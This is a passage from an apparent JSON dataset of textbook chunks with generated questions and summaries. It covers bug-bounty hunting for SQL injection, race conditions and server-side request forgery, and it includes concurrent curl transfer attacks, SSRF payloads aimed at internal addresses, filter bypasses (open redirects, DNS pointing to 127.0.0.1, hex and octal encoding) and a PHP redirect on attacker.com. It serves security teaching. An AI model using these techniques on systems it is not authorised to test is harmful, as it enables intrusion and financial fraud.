they’re\nvulnerable to SQL injections. If the endpoint isn’t vulnerable to classic\nSQL injections, try inferential techniques instead.\n3. Once you’ve confirmed that the endpoint is vulnerable to SQL injec-\ntions, use different SQL injection queries to leak information from the\ndatabase.\n4. Escalate the issue. Figure out what data you can leak from the endpoint\nand whether you can achieve an authentication bypass. Be careful not\nto execute any actions that would damage the integrity of the target’s\ndatabase, such as deleting user data or modifying the structure of the\ndatabase.\n5. Finally, draft up your first SQL injection report with an example pay-\nload that the security team can use to duplicate your results. Because\nSQL injections are quite technical to exploit most of the time, it’s a\ngood idea to spend some time crafting an easy-to-understand proof of\nconcept.\nSQL Injection 203",
    "question": "What are the different types of SQL injection vulnerabilities and how can they be detected and exploited?",
    "summary": "SQL injection is a security vulnerability that allows attackers to execute arbitrary SQL commands by manipulating input fields. This can lead to authentication bypass, data leaks, and database tampering. While SQL injection attacks are less common now due to better protections in web frameworks, they are still prevalent and can be exploited through both classic and blind methods. The chapter explains how to detect and exploit these vulnerabilities, including techniques for extracting data, gaining access, and preventing SQL injection through prepared statements, input validation, and proper database permissions."
  },
  {
    "start": 144,
    "end": 155,
    "text": "12\nR ACE CONDITIONS\nRace conditions are one of the most\ninteresting vulnerabilities in modern web\napplications. They stem from simple pro-\ngramming mistakes developers often make,\nand these mistakes have proved costly: attackers have\nused race conditions to steal money from online\nbanks, e-commerce sites, stock brokerages, and\ncryptocurrency exchanges.\nLet’s dive into how and why these vulnerabilities happen, and how\nyou can find them and exploit them.\nMechanisms\nA race condition happens when two sections of code that are designed to\nbe executed in a sequence get executed out of sequence. To understand\nhow this works, you need to first understand the concept of concurrency.\nIn computer science, concurrency is the ability to execute different parts of\na program simultaneously without affecting the outcome of the program.\nConcurrency can drastically improve the performance of programs because\ndifferent parts of the program’s operation can be run at once.\nConcurrency has two types: multiprocessing and multithreading.\nMultiprocessing refers to using multiple central processing units (CPUs), the\nhardware in a computer that executes instructions, to perform simul-\ntaneous computations. On the other hand, multithreading is the ability\nof a single CPU to provide multiple threads, or concurrent executions.\nThese threads don’t actually execute at the same time; instead, they take\nturns using the CPU’s computational power. When one thread is idle,\nother threads can continue taking advantage of the unused computing\nresources. For example, when one thread is suspended while waiting for\nuser input, another can take over the CPU to execute its computations.\nArranging the sequence of execution of multiple threads is called sched-\nuling. Different systems use different scheduling algorithms, depending on\ntheir performance priorities. For example, some systems might schedule their\ntasks by executing the highest-priority tasks first, while another system might\nexecute its tasks by giving out computational time in turns, regardless of\npriority.\nThis flexible scheduling is precisely what causes race conditions. Race\nconditions happen when developers don’t adhere to certain safe concur-\nrency principles, as we’ll discuss later in this chapter. Since the scheduling\nalgorithm can swap between the execution of two threads at any time, you\ncan’t predict the sequence in which the threads execute each action.\nTo see why the sequence of execution matters, let’s consider an example\n(courtesy of Wikipedia: https://en.wikipedia.org/wiki/Race_condition). Say two\nconcurrent threads of execution are each trying to increase the value of a\nglobal variable by 1. If the variable starts out with a value of 0, it should end\nup with a value of 2. Ideally, the threads would be executed in the stages\nshown in Table 12-1.\nTable 12-1: Normal Execution of Two Threads Operating on the Same Variable\nThread 1 Thread 2 Value of variable A\nStage 1 0\nStage 2 Read value of A 0\nStage 3 Increase A by 1 0\nStage 4 Write the value of A 1\nStage 5 Read value of A 1\nStage 6 Increase A by 1 1\nStage 7 Write the value of A 2\n206 Chapter 12\nBut if the two threads are run simultaneously, without any consider-\nation of conflicts that may occur when accessing the same resources, the\nexecution could be scheduled as in Table 12-2 instead.\nTable 12-2: Incorrect Calculation Due to a Race Condition\nThread 1 Thread 2 Value of variable A\nStage 1 0\nStage 2 Read value of A 0\nStage 3 Read value of A 0\nStage 4 Increase A by 1 0\nStage 5 Increase A by 1 0\nStage 6 Write the value of A 1\nStage 7 Write the value of A 1\nIn this case, the final value of the global variable becomes 1, which is\nincorrect. The resulting value should be 2.\nIn summary, race conditions happen when the outcome of the execu-\ntion of one thread depends on the outcome of another thread, and when\ntwo threads operate on the same resources without considering that other\nthreads are also using those resources. When these two threads are executed\nsimultaneously, unexpected outcomes can occur. Certain programming\nlanguages, such as C/C++, are more prone to race conditions because of the\nway they manage memory.\nWhen a Race Condition Becomes a Vulnerability\nA race condition becomes a vulnerability when it affects a security control\nmechanism. In those cases, attackers can induce a situation in which a sen-\nsitive action executes before a security check is complete. For this reason,\nrace condition vulnerabilities are also referred to as time-of-check or time-of-\nuse vulnerabilities.\nImagine that the two threads of the previous example are executing\nsomething a little more sensitive: the transfer of money between bank\naccounts. The application would have to perform three subtasks to transfer\nthe money correctly. First, it has to check if the originating account has a\nhigh enough balance. Then, it must add money to the destination account.\nFinally, it must deduct the same amount from the originating account.\nLet’s say that you own two bank accounts, account A and account B. You\nhave $500 in account A and $0 in account B. You initiate two money trans-\nfers of $500 from account A to account B at the same time. Ideally, when two\nmoney transfer requests are initiated, the program should behave as shown\nin Table 12-3.\nRace Conditions 207\nTable 12-3: Normal Execution of Two Threads Operating on the Same Bank Account\nThread 1 Thread 2 Balance of accounts A + B\nStage 1 Check account A $500\nbalance ($500)\nStage 2 Add $500 to account B $1,000 ($500 in A, $500 in B)\nStage 3 Deduct $500 from $500 ($0 in A, $500 in B)\naccount A\nStage 4 Check account $500 ($0 in A, $500 in B)\nA balance ($0)\nStage 5 Transfer fails $500 ($0 in A, $500 in B)\n(low balance)\nYou end up with the correct amount of money in the end: a total of\n$500 in your two bank accounts. But if you can send the two requests simul-\ntaneously, you might be able to induce a situation in which the execution of\nthe threads looks like Table 12-4.\nTable 12-4: Faulty Transfer Results Due to a Race Condition\nThread 1 Thread 2 Balance of accounts A + B\nStage 1 Check account A $500\nbalance ($500)\nStage 2 Check account A $500\nbalance ($500)\nStage 3 Add $500 to $1,000 ($500 in A, $500 in B)\naccount B\nStage 4 Add $500 to $1,500 ($500 in A, $1,000 in B)\naccount B\nStage 5 Deduct $500 from $1,000 ($0 in A, $1,000 in B)\naccount A\nStage 6 Deduct $500 from $1,000 ($0 in A, $1,000 in B)\naccount A\nNote that, in this scenario, you end up with more money than you started\nwith. Instead of having $500 in your accounts, you now own a total of $1,000.\nYou made an additional $500 appear out of thin air by exploiting a race con-\ndition vulnerability!\nAlthough race conditions are often associated with financial sites, attack-\ners can use them in other situations too, such as to rig online voting systems.\nLet’s say an online voting system performs three subtasks to process an\nonline vote. First, it checks if the user has already voted. Then, it adds a vote\nto the vote count of the selected candidate. Finally, it records that that user\nhas voted to prevent them from casting a vote again.\nSay you try to cast a vote for candidate A twice, simultaneously. Ideally,\nthe application should reject the second vote, following the procedure in\nTable 12-5.\n208 Chapter 12\nTable 12-5: Normal Execution of Two Threads Operating on the Same User’s Votes\nThread 1 Thread 2 Votes for candidate A\nStage 1 100\nStage 2 Check whether the user 100\nhas already voted (they\nhaven’t)\nStage 3 Increase candidate A’s 101\nvote count\nStage 4 Mark the user as 101\nAlready Voted\nStage 5 Check whether the user 101\nhas already voted (they\nhave)\nStage 6 Reject the user’s vote 101\nBut if the voting application has a race condition vulnerability, execu-\ntion might turn into the scenario shown in Table 12-6, which gives the users\nthe power to cast potentially unlimited votes.\nTable 12-6: User Able to Vote Twice by Abusing a Race Condition\nThread 1 Thread 2 Votes for candidate A\nStage 1 100\nStage 2 Check whether the user 100\nhas already voted (they\nhaven’t)\nStage 3 Check whether the user 100\nhas already voted (they\nhaven’t)\nStage 4 Increase candidate A’s 101\nvote count\nStage 5 Increase candidate A’s 102\nvote count\nStage 6 Mark the user as 102\nAlready Voted\nStage 7 Mark the user as 102\nAlready Voted\nAn attacker can follow this procedure to fire two, ten, or even hundreds\nof requests at once, and then see which vote requests get processed before\nthe user is marked as Already Voted.\nMost race condition vulnerabilities are exploited to manipulate money,\ngift card credits, votes, social media likes, and so on. But race conditions\ncan also be used to bypass access control or trigger other vulnerabilities.\nYou can read about some real-life race condition vulnerabilities on the\nHackerOne Hacktivity feed (https://hackerone.com/hacktivity?querystring\n=race%20condition/).\nRace Conditions 209\nPrevention\nThe key to preventing race conditions is to protect resources during execu-\ntion by using a method of synchronization, or mechanisms that ensure\nthreads using the same resources don’t execute simultaneously.\nResource locks are one of these mechanisms. They block other threads\nfrom operating on the same resource by locking a resource. In the bank\ntransfer example, thread 1 could lock the balance of accounts A and B\nbefore modifying them so that thread 2 would have to wait for it to finish\nbefore accessing the resources.\nMost programming languages that have concurrency abilities also have\nsome sort of synchronization functionality built in. You have to be aware of\nthe concurrency issues in your applications and apply synchronization mea-\nsures accordingly. Beyond synchronization, following secure coding practices,\nlike the principle of least privilege, can prevent race conditions from turning\ninto more severe security issues.\nThe principle of least privilege means that applications and processes\nshould be granted only the privileges they need to complete their tasks. For\nexample, when an application requires only read access to a file, it should\nnot be granted any write or execute permissions. You should grant applica-\ntions precisely the permissions that they need instead. This lowers the risks\nof complete system compromise during an attack.\nHunting for Race Conditions\nHunting for race conditions is simple. But often it involves an element of\nluck. By following these steps, you can make sure that you maximize your\nchances of success.\nStep 1: Find Features Prone to Race Conditions\nAttackers use race conditions to subvert access controls. In theory, any appli-\ncation whose sensitive actions rely on access-control mechanisms could be\nvulnerable.\nMost of the time, race conditions occur in features that deal with\nnumbers, such as online voting, online gaming scores, bank transfers,\ne-commerce payments, and gift card balances. Look for these features in\nan application and take note of the request involved in updating these\nnumbers.\nFor example, let’s say that, in your proxy, you’ve spotted the request\nused to transfer money from your banking site. You should copy this request\nto use for testing. In Burp Suite, you can copy a request by right-clicking it\nand selecting Copy as curl command.\nStep 2: Send Simultaneous Requests\nYou can then test for and exploit race conditions in the target by sending\nmultiple requests to the server simultaneously.\n210 Chapter 12\nFor example, if you have $3,000 in your bank account and want to see\nif you can transfer more money than you have, you can simultaneously send\nmultiple requests for transfer to the server via the curl command. If you’ve\ncopied the command from Burp, you can simply paste the command into\nyour terminal multiple times and insert a & character between each one. In\nthe Linux terminal, the & character is used to execute multiple commands\nsimultaneously in the background:\ncurl (transfer $3000) & curl (transfer $3000) & curl (transfer $3000)\n& curl (transfer $3000) & curl (transfer $3000) & curl (transfer $3000)\nBe sure to test for operations that should be allowed once, but not multiple\ntimes! For example, if you have a bank account balance of $3,000, testing to\ntransfer $5,000 is pointless, because no single request would be allowed. But\ntesting a transfer of $10 multiple times is also pointless, since you should be\nable to do that even without a race condition. The key is to test the applica-\ntion’s limits by executing operations that should not be repeatable.\nStep 3: Check the Results\nCheck if your attack has succeeded. In our example, if your destination\naccount ends up with more than a $3,000 addition after the simultaneous\nrequests, your attack has succeeded, and you can determine that a race\ncondition exists on the transfer balance endpoint.\nNote that whether your attack succeeds depends on the server’s process-\nscheduling algorithm, which is a matter of luck. However, the more requests\nyou send within a short time frame, the more likely your attack will succeed.\nAlso, many tests for race conditions won’t succeed the first time, so it’s a\ngood idea to try a few more times before giving up.\nStep 4: Create a Proof of Concept\nOnce you have found a race condition, you will need to provide proof of the\nvulnerability in your report. The best way to do this is to lay out the steps\nneeded to exploit the vulnerability. For example, you can lay out the exploi-\ntation steps like so:\n1. Create an account with a $3,000 balance and another one with zero\nbalance. The account with $3,000 will be the source account for our\ntransfers, and the one with zero balance will be the destination.\n2. Execute this command:\ncurl (transfer $3000) & curl (transfer $3000) & curl (transfer $3000)\n& curl (transfer $3000) & curl (transfer $3000) & curl (transfer $3000)\nThis will attempt to transfer $3,000 to another account multiple times\nsimultaneously.\n3. You should see more than $3,000 in the destination account. Reverse\nthe transfer and try the attack a few more times if you don’t see more\nthan $3,000 in the destination account.\nRace Conditions 211\nSince the success of a race condition attack depends on luck, make sure\nyou include instructions to try again if the first test fails. If the vulnerability\nexists, the attack should succeed eventually after a few tries.\nEscalating Race Conditions\nThe severity of race conditions depends on the impacted functionality. When\ndetermining the impact of a specific race condition, pay attention to how\nmuch an attacker can potentially gain in terms of monetary reward or social\ninfluence.\nFor example, if a race condition is found on a critical functionality like\ncash withdrawal, fund transfer, or credit card payment, the vulnerability\ncould lead to infinite financial gain for the attacker. Prove the impact of a\nrace condition and articulate what attackers will be able to achieve in your\nreport.\nFinding Your First Race Condition!\nNow you’re ready to find your first race condition. Follow these steps to\nmanipulate web applications using this neat technique:\n1. Spot the features prone to race conditions in the target application and\ncopy the corresponding requests.\n2. Send multiple of these critical requests to the server simultaneously.\nYou should craft requests that should be allowed once but not allowed\nmultiple times.\n3. Check the results to see if your attack has succeeded. And try to execute\nthe attack multiple times to maximize the chance of success.\n4. Consider the impact of the race condition you just found.\n5. Draft up your first race condition report!\n212 Chapter 12\n13\nSERVER-SIDE REQUEST FORGERY\nServer-side request forgery (SSRF) is a vulner-\nability that lets an attacker send requests on\nbehalf of a server. During an SSRF, attackers\nforge the request signatures of the vulnerable\nserver, allowing them to assume a privileged position\non a network, bypass firewall controls, and gain access\nto internal services.\nIn this chapter, we’ll cover how SSRF works, how to bypass common\nprotections for it, and how to escalate the vulnerability when you find one.\nMechanisms\nSSRF vulnerabilities occur when an attacker finds a way to send requests as a\ntrusted server in the target’s network. Imagine a public-facing web server on\nexample.com’s network named public.example.com. This server hosts a proxy ser-\nvice, located at public.example.com/proxy, that fetches the web page specified\nin the url parameter and displays it back to the user. For example, when\nthe user accesses the following URL, the web application would display the\ngoogle.com home page:\nhttps://public.example.com/proxy?url=https://google.com\nNow let’s say admin.example.com is an internal server on the network\nhosting an admin panel. To ensure that only employees can access the\npanel, administrators set up access controls to keep it from being reached\nvia the internet. Only machines with a valid internal IP, like an employee\nworkstation, can access the panel.\nNow, what if a regular user accesses the following URL?\nhttps://public.example.com/proxy?url=https://admin.example.com\nHere, the url parameter is set to the URL of the internal admin panel.\nWith no SSRF protection mechanism in place, the web application would\ndisplay the admin panel to the user, because the request to the admin panel\nis coming from the web server, public.example.com, a trusted machine on the\nnetwork.\nThrough SSRF, servers accept unauthorized requests that firewall controls\nwould normally block, like fetching the admin panel from a non-company\nmachine. Often, the protection that exists on the network perimeter, between\npublic-facing web servers and internet machines, does not exist between\nmachines on the trusted network. Therefore, the protection that hides the\nadmin panel from the internet doesn’t apply to requests sent between the web\nserver and the admin panel server.\nBy forging requests from trusted servers, an attacker can pivot into an\norganization’s internal network and conduct all kinds of malicious activi-\nties. Depending on the permissions given to the vulnerable internet-facing\nserver, an attacker might be able to read sensitive files, make internal API\ncalls, and access internal services.\nSSRF vulnerabilities have two types: regular SSRF and blind SSRF. The\nmechanisms behind both are the same: each exploits the trust between\nmachines on the same network. The only difference is that in a blind SSRF,\nthe attacker does not receive feedback from the server via an HTTP response\nor an error message. For instance, in the earlier example, we’d know the\nSSRF worked if we see admin.example.com displayed. But in a blind SSRF, the\nforged request executes without any confirmation sent to the attacker.\nLet’s say that on public.example.com another functionality allows users\nto send requests via its web server. But this endpoint does not return the\nresulting page to the user. If attackers can send requests to the internal\nnetwork, the endpoint suffers from a blind SSRF vulnerability:\nhttps://public.example.com/send_request?url=https://admin.example.com/delete_user?user=1\n214 Chapter 13\nAlthough blind SSRFs are harder to exploit, they’re still extremely valu-\nable to an attacker, who might be able to perform network scanning and\nexploit other vulnerabilities on the network. We’ll get more into this later.\nPrevention\nSSRFs happen when servers need to send requests to obtain external\nresources. For example, when you post a link on Twitter, Twitter fetches an\nimage from that external site to create a thumbnail. If the server doesn’t stop\nusers from accessing internal resources using the same mechanisms, SSRF\nvulnerabilities occur.\nLet’s look at another example. Say a page on public.example.com allows\nusers to upload a profile photo by retrieving it from a URL via this POST\nrequest:\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=https://www.attacker.com/profile.jpeg\nTo fetch profile.jpeg from attacker.com, the web application would have to\nvisit and retrieve contents from attacker.com. This is the safe and intended\nbehavior of the application. But if the server does not make a distinction\nbetween internal and external resources, an attacker could just as easily\nrequest a local file stored on the server, or any other file on the network.\nFor instance, they could make the following POST request, which would\ncause the web server to fetch the sensitive file and display it as the user’s\nprofile picture:\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=https://localhost/passwords.txt\nTwo main types of protection against SSRFs exist: blocklists and allow-\nlists. Blocklists are lists of banned addresses. The server will block a request\nif it contains a blocklisted address as input. Because applications often need\nto fetch resources from a variety of internet sources, too many to explicitly\nallow, most applications use this method. Companies blocklist internal net-\nwork addresses and reject any request that redirects to those addresses.\nOn the other hand, when a site implements allowlist protection, the\nserver allows only requests that contain URLs found in a predetermined list\nand rejects all other requests. Some servers also protect against SSRFs by\nrequiring special headers or secret tokens in internal requests.\nServer-Side Request Forgery 215\nHunting for SSRFs\nThe best way to discover SSRF vulnerabilities is through a review of the\napplication’s source code, in which you check if the application validates\nall user-provided URLs. But when you can’t obtain the source code, you\nshould focus your efforts on testing the features most prone to SSRF.\nStep 1: Spot Features Prone to SSRFs\nSSRFs occur in features that require visiting and fetching external\nresources. These include webhooks, file uploads, document and image\nprocessors, link expansions or thumbnails, and proxy services. It’s also\nworth testing any endpoint that processes a user-provided URL. And pay\nattention to potential SSRF entry points that are less obvious, like URLs\nembedded in files that are processed by the application (XML files and\nPDF files can often be used to trigger SSRFs), hidden API endpoints that\naccept URLs as input, and input that gets inserted into HTML tags.\nWebhooks are custom HTTP callback endpoints used as a notifica-\ntion system for certain application events. When an event such as new\nuser sign-up or application error occurs, the originating site will make\nan HTTP request to the webhook URL. These HTTP requests help the\ncompany collect information about the website’s performance and visi-\ntors. It also helps organizations keep data in sync across multiple web\napplications.\nAnd in the event that one action from an application needs to trigger\nan action on another application, webhooks are a way of notifying the\nsystem to kick-start another process. For example, if a company wants to\nsend a welcome email to every user who follows its social media account,\nit can use a webhook to connect the two applications.\nMany websites allow users to set up their webhook URLs, and these\nsettings pages are often vulnerable to SSRF. Most of the time, an appli-\ncation’s webhook service is in its developers’ portal. For example, Slack\nallows application owners to set up a webhook via its app configuration\npage (https://api.slack.com/apps/). Under the Event Subscriptions heading,\nyou can specify a URL at which Slack will notify you when special events\nhappen (Figure 13-1). The Request URL field of these webhook services\nis often vulnerable to SSRF.\nOn the other hand, proxy services refer to services that act as an interme-\ndiary between two machines. They sit between the client and the server\nof a request to facilitate or control their communication. Common use\ncases of proxy services are to bypass organization firewalls that block\ncertain websites, browse the internet anonymously, or encrypt internet\nmessages.\n216 Chapter 13\nFigure 13-1: Adding a webhook to Slack\nNotice these potentially vulnerable features on the target site and\nrecord them for future reference in a list like this:\nPotential SSRF Endpoints\nAdd a new webhook:\nPOST /webhook\nHost: public.example.com\n(POST request body)\nurl=https://www.attacker.com\nFile upload via URL:\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=https://www.attacker.com/profile.jpeg\nProxy service:\nhttps://public.example.com/proxy?url=https://google.com\nServer-Side Request Forgery 217\nStep 2: Provide Potentially Vulnerable Endpoints with Internal URLs\nOnce you’ve identified the potentially vulnerable endpoints, provide internal\naddresses as the URL inputs to these endpoints. Depending on the network\nconfiguration, you might need to try several addresses before you find the\nones in use by the network. Here are some common ones reserved for the pri-\nvate network: localhost, 127.0.0.1, 0.0.0.0, 192.168.0.1, and 10.0.0.1.\nYou can find more reserved IP addresses used to identify machines on\nthe private network at https://en.wikipedia.org/wiki/Reserved_IP_addresses.\nTo illustrate, this request tests the webhook functionality:\nPOST /webhook\nHost: public.example.com\n(POST request body)\nurl=https://192.168.0.1\nThis request tests the file upload functionality:\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=https://192.168.0.1\nAnd this request tests the proxy service:\nhttps://public.example.com/proxy?url=https://192.168.0.1\nStep 3: Check the Results\nIn the case of regular SSRF, see if the server returns a response that reveals\nany information about the internal service. For example, does the response\ncontain service banners or the content of internal pages? A service banner is\nthe name and version of the software running on the machine. Check for\nthis by sending a request like this:\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=127.0.0.1:22\nPort 22 is the default port for the Secure Shell Protocol (SSH). This\nrequest tells the application that the URL of our profile picture is located\nat 127.0.0.1:22, or port 22 of the current machine. This way, we can trick the\nserver into visiting its own port 22 and returning information about itself.\nThen look for text like this in the response:\nError: cannot upload image: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4\n218 Chapter 13\nIf you find a message like this, you can be sure that an SSRF vulnerabil-\nity exists on this endpoint, since you were able to gather information about\nthe localhost.\nThe easiest way of detecting blind SSRFs is through out-of-band tech-\nniques: you make the target send requests to an external server that you\ncontrol, and then monitor your server logs for requests from the target.\nOne way to do this is to use an online hosting service, such as GoDaddy or\nHostinger, that provides server access logs. You can link your hosted site to\na custom domain and submit that domain in the SSRF testing payload.\nYou can also turn your own machine into a listener by using Netcat, a\nutility installed by default on most Linux machines. If you don’t already have\nNetcat, you can install it by using the command apt-get install netcat. Then\nuse nc -lp 8080 to start a listener on port 8080. After this, you can point\nyour SSRF payloads to your IP address on port 8080 and monitor for any\nincoming traffic. Another easier way of doing this is to use the Collaborator\nfeature in Burp Suite Pro, which automatically generates unique domain\nnames, sends them as payloads to the target, and monitors for any interac-\ntion associated with the target.\nHowever, being able to generate an outbound request from the target\nserver alone is not an exploitable issue. Since you cannot use blind SSRFs\nto read internal files or access internal services, you need to confirm their\nexploitability by trying to explore the internal network with the SSRF. Make\nrequests to various target ports and see if server behavior differs between\ncommonly open and closed ports. For example, ports 22, 80, and 443 are\ncommonly open ports, while port 11 is not. This will help you determine if\nan attacker can use the SSRF to access the internal network. You can look\nespecially for differences in response time and HTTP response codes.\nFor example, servers use the HTTP status code 200 to indicate that a\nrequest has succeeded. Often, if a server is able to connect to the specified\nport, it will return a 200 status code. Say the following request results in an\nHTTP status code of 200:\nPOST /webhook\nHost: public.example.com\n(POST request body)\nurl=https://127.0.0.1:80\nThe following request instead results in an HTTP status code of 500,\nthe status code for Internal Server Error. Servers return 500 status codes\nwhen they run into an error while processing the request, so a 500 status\ncode often indicates a closed or protected port:\nPOST /webhook\nHost: public.example.com\n(POST request body)\nurl=https://127.0.0.1:11\nServer-Side Request Forgery 219\nYou can confirm that the server is indeed making requests to these\nports and responding differently based on port status.\nAlso look for the time difference between responses. You can see in\nFigure 13-2 that the Burp repeater shows how long it took for the server\nto respond in the bottom right corner. Here, it took 181 milliseconds for\nGoogle to return its home page. You can use tools like SSRFmap (https://\ngithub.com/swisskyrepo/SSRFmap/) to automate this process.\nFigure 13-2: Burp repeater shows you how long it took for the server to respond to a request.\nIf a port is closed, the server usually responds faster because it drops\nthe forwarded traffic immediately, whereas internal firewalls often cause a\ndelay in the response. Attackers can use time delays as a metric to figure out\na target’s internal network structure. If you can identify a significant time\ndifference between requests to different ports, you have found an exploit-\nable SSRF.\nBypassing SSRF Protection\nWhat if you submit an SSRF payload, but the server returns this response?\nError. Requests to this address are not allowed. Please try again.\nThis SSRF was blocked by a protection mechanism, possibly a URL\nallowlist or blocklist. But all is not lost! The site may have protection mecha-\nnisms implemented, but this doesn’t mean that the protection is complete.\nHere are a few more things you can try to bypass a site’s protection.\nBypass Allowlists\nAllowlists are generally the hardest to bypass, because they are, by default,\nstricter than blocklists. But getting around them is still possible if you can\n220 Chapter 13\nfind an open redirect vulnerability within the allowlisted domains. (Visit\nChapter 7 for more information about these vulnerabilities.) If you find\none, you can request an allowlisted URL that redirects to an internal URL.\nFor example, even if the site allows only profile pictures uploaded from one\nof its subdomains, you can induce an SSRF through an open redirect.\nIn the following request, we utilize an open redirect on pics.example.com\nto redirect the request to 127.0.0.1, the IP address for the localhost. This\nway, even though the url parameter passes the allowlist, it still redirects to a\nrestricted internal address:\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1\nThe server could also have implemented its allowlist via poorly designed\nregular expressions (regexes). Regexes are often used to construct more\nflexible allowlists. For example, instead of checking whether a URL string is\nequal to \"example.com\", a site can check regex expressions like .*example.com.*\nto match the subdomains and filepaths of example.com as well. In those cases,\nyou could bypass the regex by placing the allowlisted domain in the request\nURL. For example, this request will redirect to 127.0.0.1, since pics.example.com\nis seen as the username portion of the URL:\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=https://pics.example.com@127.0.0.1\nThe following request also redirects to 127.0.0.1, since pics.example.com is\nseen as the directory portion of the URL:\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=https://127.0.0.1/pics.example.com\nYou can test whether a site is using an overly flexible regex allowlist by\ntrying URLs like these and seeing if the filter allows it. Note that a regex-\nbased allowlist can be secure if the regex is well constructed. And these\nURLs won’t always succeed!\nBypass Blocklists\nSince applications often need to fetch resources from a variety of internet\nsources, most SSRF protection mechanisms come in the form of a blocklist.\nIf you’re faced with a blocklist, there are many ways of tricking the server.\nServer-Side Request Forgery 221\nFooling It with Redirects\nFirst, you can make the server request a URL that you control and that redi-\nrects to the blocklisted address. For example, you can ask the target server\nto send a request to your server:\nhttps://public.example.com/proxy?url=https://attacker.com/ssrf\nThen, on your server at https://attacker.com/ssrf, you can host a file with\nthe following content:\n<?php header(\"location: http://127.0.0.1\"); ?>\nThis is a piece of PHP code that redirects the request by setting the\ndocument’s location to 127.0.0.1. When you make the target server request\nhttps://attacker.com/ssrf, the target server is redirected to http://127.0.0.1, a\nrestricted internal address. This attack will bypass blocklists because the\nURL submitted to the application does not itself contain any blocklisted\naddresses.\nUsing IPv6 Addresses\nI mentioned in Chapter 3 that IPv6 addresses are a newer alternative to the\nmore commonly used IPv4 addresses. The Internet Engineering Task Force\n(IETF) created IPv6 addresses as the world began running out of available\nIPv4 addresses and needed a format that provided a larger number of possi-\nble addresses. IPv6 addresses are 128-bit values represented in hexadecimal\nnotation, and they look like this: 64:ff9b::255.255.255.255.\nSometimes the SSRF protection mechanisms a site has implemented for\nIPv4 might not have been implemented for IPv6. That means you can try\nto submit IPv6 addresses that point to the local network. For example, the\nIPv6 address ::1 points to the localhost, and fc00:: is the first address on the\nprivate network.\nFor more information about how IPv6 works, and about other reserved\nIPv6 addresses, visit Wikipedia: https://en.wikipedia.org/wiki/IPv6_address.\nTricking the Server with DNS\nYou can also try confusing the server with DNS records, which computers\nuse to translate hostnames into IP addresses. DNS records come in various\ntypes, but the ones you’ll hear about most often are A and AAAA records. A\nrecords point a hostname to an IPv4 address, whereas AAAA records translate\nhostnames to an IPv6 address.\nModify the A/AAAA record of a domain you control and make it point\nto the internal addresses on the victim’s network. You can check the current\nA/AAAA records of your domain by running these commands:\nnslookup DOMAIN\nnslookup DOMAIN -type=AAAA\n222 Chapter 13\nYou can usually configure the DNS records of your domain name by\nusing your domain registrar or web-hosting service’s settings page. For\ninstance, I use Namecheap as my domain service. In Namecheap, you\ncan configure your DNS records by going to your account and choosing\nDomain ListManage DomainAdvanced DNSAdd New Record. Create a\ncustom mapping of hostname to IP address and make your domain resolve\nto 127.0.0.1. You can do this by creating a new A record for your domain\nthat points to 127.0.0.1.\nThen you can ask the target server to send a request to your server, like:\nhttps://public.example.com/proxy?url=https://attacker.com\nNow when the target server requests your domain, it will think your\ndomain is located at 127.0.0.1 and request data from that address.\nSwitching Out the Encoding\nThere are many ways of encoding a URL or an address. Character encod-\nings are different ways of representing the same character while preserving\nits meaning. They are often used to make data transportation or storage\nmore efficient. These encoding methods don’t change how a server inter-\nprets the location of the address, but they might allow the input to slip\nunder the radar of a blocklist if it bans only addresses that are encoded a\ncertain way.\nPossible encoding methods include hex encoding, octal encoding,\ndword encoding, URL encoding, and mixed encoding. If the URL parser\nof the target server does not process these encoding methods appropriately,\nyou might be able to bypass SSRF protection. So far, the addresses provided\nas examples in this book have used decimal encoding, the base-10 format that\nuses characters ranging from 0 to 9. To translate a decimal-formatted IP\naddress to hex, calculate each dot-delineated section of the IP address into\nits hex equivalent. You could use a decimal-to-hex calculator to do this,\nand then put together the entire address. For example, 127.0.0.1 in decimal\ntranslates to 0x7f.0x0.0x0.0x1 in hex. The 0x at the beginning of each sec-\ntion designates it as a hex number. You can then use the hex address in the\npotential SSRF endpoint:\nhttps://public.example.com/proxy?url=https://0x7f.0x0.0x0.0x1\nOctal encoding is a way of representing characters in a base-8 format\nby using characters ranging from 0 to 7. As with hex, you can translate an\nIP address to octal form by recalculating each section. You can utilize an\nonline calculator for this too; just search for decimal to octal calculator to find\none. For example, 127.0.0.1 translates to 0177.0.0.01. In this case, the lead-\ning zeros are necessary to convey that that section is an octal number. Then\nuse it in the potential SSRF endpoint:\nhttps://public.example.com/proxy?url=https://0177.0.0.01\nServer-Side Request Forgery 223",
    "question": "What is a race condition and how can it be exploited to manipulate sensitive data in web applications?",
    "summary": "Race conditions occur when multiple threads of code execute out of order, leading to unexpected results in web applications. Attackers can exploit these vulnerabilities to manipulate financial transactions, votes, or other sensitive data. Prevention involves using synchronization mechanisms and secure coding practices to ensure thread safety. SSRF is a vulnerability that allows attackers to send requests on behalf of a server, potentially accessing internal services or bypassing firewall protections. To exploit SSRF, testers can use internal URLs, DNS manipulation, or URL encoding to trick the server into making unauthorized requests."
  },
  {
    "start": 156,
    "end": 160,
